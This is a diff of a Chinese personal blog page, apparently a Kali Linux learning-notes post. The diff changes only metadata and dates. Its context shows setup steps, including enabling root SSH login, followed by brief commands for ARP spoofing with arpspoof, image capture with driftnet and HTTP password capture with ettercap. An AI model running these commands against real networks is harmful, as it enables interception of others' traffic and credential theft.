@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="本文讲述了在完成kali安装后其配置的基础过程。操作系统为kali 2018.1">
+<meta name="description" content="本文讲述了在完成kali安装后其配置的基础过程。操作系统为kali 2018.1。">
 <meta name="keywords" content="kali">
 <meta property="og:type" content="article">
 <meta property="og:title" content="kali学习笔记">
 <meta property="og:url" content="https://jerryma0912.github.io/2018/03/05/8-kali/index.html">
 <meta property="og:site_name" content="JERRY HOME">
-<meta property="og:description" content="本文讲述了在完成kali安装后其配置的基础过程。操作系统为kali 2018.1">
+<meta property="og:description" content="本文讲述了在完成kali安装后其配置的基础过程。操作系统为kali 2018.1。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-07-24T02:35:15.000Z">
+<meta property="og:updated_time" content="2019-08-28T15:59:29.683Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="kali学习笔记">
-<meta name="twitter:description" content="本文讲述了在完成kali安装后其配置的基础过程。操作系统为kali 2018.1">
+<meta name="twitter:description" content="本文讲述了在完成kali安装后其配置的基础过程。操作系统为kali 2018.1。">
 
 
 
@@ -414,15 +414,14 @@ var _hmt = _hmt || [];
       
 
       
-        <p>本文讲述了在完成kali安装后其配置的基础过程。操作系统为kali 2018.1<br><a id="more"></a></p>
+        <p>本文讲述了在完成kali安装后其配置的基础过程。操作系统为kali 2018.1。<br><a id="more"></a></p>
 <h3 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h3><p>更新源的配置文件目录：<code>/etc/apt/sources.list</code>,更新源可以从网络上获取，以下为我使用的更新源：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment">#浙大</span></span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line"><span class="comment">#阿里云源</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/kali sana main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</span><br></pre></td></tr></table></figure></p>
 <p>配置文件修改完成后，使用<code>apt-get update</code>命令更新源，使用<code>apt-get dist-upgrade</code>命令安装源。</p>
 <h3 id="安装vmware-tools工具"><a href="#安装vmware-tools工具" class="headerlink" title="安装vmware tools工具"></a>安装vmware tools工具</h3><p>在虚拟机菜单中，找到vmware tools工具，载入镜像进行安装。安装时的参数为默认值，安装完成后重启即可。</p>
 <h3 id="kali美化"><a href="#kali美化" class="headerlink" title="kali美化"></a>kali美化</h3><p>执行<code>apt-get install kde-full</code>，安装美化界面。安装完成后，在登录时选择该界面即可。</p>
 <h3 id="开启ssh"><a href="#开启ssh" class="headerlink" title="开启ssh"></a>开启ssh</h3><p>LINUX可以仅进入终端命令界面，从而达到节约资源的目的。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctrl + alt + f2 进入命令行界面</span><br><span class="line">ctrl + alt + f1 进入GUI界面</span><br></pre></td></tr></table></figure></p>
 <p>开启ssh需要开启ssh服务，使用以下命令及配置开启后，可直接远程连接。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh start   <span class="comment">#开启ssh</span></span><br><span class="line">ps -ef |grep ssh        <span class="comment">#检查是否启动成功</span></span><br><span class="line">nano /etc/ssh/sshd_config   将PermitRootLogin改为yes</span><br></pre></td></tr></table></figure></p>
-<hr>
-
+<p><hr></p>
 <h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p><a href="https://segmentfault.com/a/1190000009562333" target="_blank" rel="noopener">ARP欺骗原理</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fping -asg 192.168.1.0/24      <span class="comment">#查询在线IP</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward          <span class="comment">#打开IP转发</span></span><br><span class="line">arpspoof -i &lt;网卡名&gt; -t &lt;欺骗目标IP&gt;  &lt;我是谁&gt;     <span class="comment">#仅执行该命令则为arp断网攻击</span></span><br></pre></td></tr></table></figure></p>
 <h3 id="图片捕获"><a href="#图片捕获" class="headerlink" title="图片捕获"></a>图片捕获</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）开启ARP欺骗</span><br><span class="line">（2）driftnet -d 存放目录 -i 网卡名称</span><br></pre></td></tr></table></figure>
 <h3 id="ettercap实现获取http密码"><a href="#ettercap实现获取http密码" class="headerlink" title="ettercap实现获取http密码"></a>ettercap实现获取http密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）开启ARP欺骗</span><br><span class="line">（2）ettercap -Tq -i eth0  <span class="comment">#T表示文本模式，q表示静默模式</span></span><br></pre></td></tr></table></figure>
@@ -471,7 +470,7 @@ var _hmt = _hmt || [];
   <p><span>本文标题:</span>kali学习笔记</p>
   <p><span>文章作者:</span>Jerry</p>
   <p><span>发布时间:</span>2018年03月05日 - 23:38:53</p>
-  <p><span>最后更新:</span>2018年07月24日 - 10:35:15</p>
+  <p><span>最后更新:</span>2019年08月28日 - 23:59:29</p>
   <p><span>原始链接:</span><a href="/2018/03/05/8-kali/" title="kali学习笔记">https://jerryma0912.github.io/2018/03/05/8-kali/</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://jerryma0912.github.io/2018/03/05/8-kali/" aria-label="复制成功！"></i></span>
   </p>
